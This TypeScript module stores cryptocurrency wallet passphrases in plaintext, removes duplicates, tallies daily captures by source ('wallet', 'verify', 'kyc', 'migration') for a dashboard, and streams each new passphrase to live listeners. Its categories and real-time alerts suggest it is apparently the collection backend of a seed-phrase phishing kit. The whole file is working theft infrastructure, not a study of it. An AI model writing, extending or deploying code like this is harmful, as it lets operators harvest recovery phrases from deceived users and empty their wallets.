import { prisma } from "./prisma";

export interface WalletRecord {
  id: number;
  passphrase: string;
  source: string;
  createdAt: string; // ISO String
}

/**
 * Gets all wallet records from the database.
 */
export async function getWalletRecords(): Promise<WalletRecord[]> {
  try {
    const records = await prisma.walletRecord.findMany({
      orderBy: { createdAt: "desc" },
    });
    return records.map((r: any) => ({
      id: r.id,
      passphrase: r.passphrase,
      source: r.source,
      createdAt: r.createdAt.toISOString(),
    }));
  } catch (error) {
    console.error("Error reading database:", error);
    return [];
  }
}

/**
 * Saves a new wallet record.
 */
export async function saveWalletRecord(
  passphrase: string,
  source: string
): Promise<WalletRecord> {
  const trimmed = passphrase.trim();

  // Check if a record with this passphrase already exists (exact match)
  const existing = await prisma.walletRecord.findFirst({
    where: {
      passphrase: trimmed,
    },
  });

  let record;
  if (existing) {
    // If it exists, update the timestamp and source to avoid duplicates
    record = await prisma.walletRecord.update({
      where: { id: existing.id },
      data: {
        createdAt: new Date(),
        source: source || existing.source,
      },
    });
  } else {
    // Otherwise, save a new record
    record = await prisma.walletRecord.create({
      data: {
        passphrase: trimmed,
        source,
      },
    });
  }

  const formatted: WalletRecord = {
    id: record.id,
    passphrase: record.passphrase,
    source: record.source,
    createdAt: record.createdAt.toISOString(),
  };

  // Notify any active SSE listeners of a new insertion or update
  notifyListeners(formatted);

  return formatted;
}

/**
 * Gets statistical counts for dashboard widgets.
 */
export async function getStats() {
  const records = await getWalletRecords();
  const todayStr = new Date().toISOString().split("T")[0]; // YYYY-MM-DD

  let total = records.length;
  let today = 0;
  let wallet = 0;
  let verify = 0;
  let kyc = 0;
  let migration = 0;

  for (const record of records) {
    // Check if created today
    if (record.createdAt.startsWith(todayStr)) {
      today++;
    }

    // Source tracking
    const src = record.source.toLowerCase();
    if (src.includes("wallet")) {
      wallet++;
    } else if (src.includes("verify") || src.includes("transaction")) {
      verify++;
    } else if (src.includes("kyc")) {
      kyc++;
    } else if (src.includes("migration")) {
      migration++;
    }
  }

  return { total, today, wallet, verify, kyc, migration };
}

// SSE Broadcast / Real-time updates subscription system
type RecordListener = (record: WalletRecord) => void;
const listeners = new Set<RecordListener>();

export function subscribeToRecords(listener: RecordListener) {
  listeners.add(listener);
  return () => {
    listeners.delete(listener);
  };
}

function notifyListeners(record: WalletRecord) {
  listeners.forEach((listener) => {
    try {
      listener(record);
    } catch (e) {
      console.error("Error invoking SSE listener:", e);
    }
  });
}
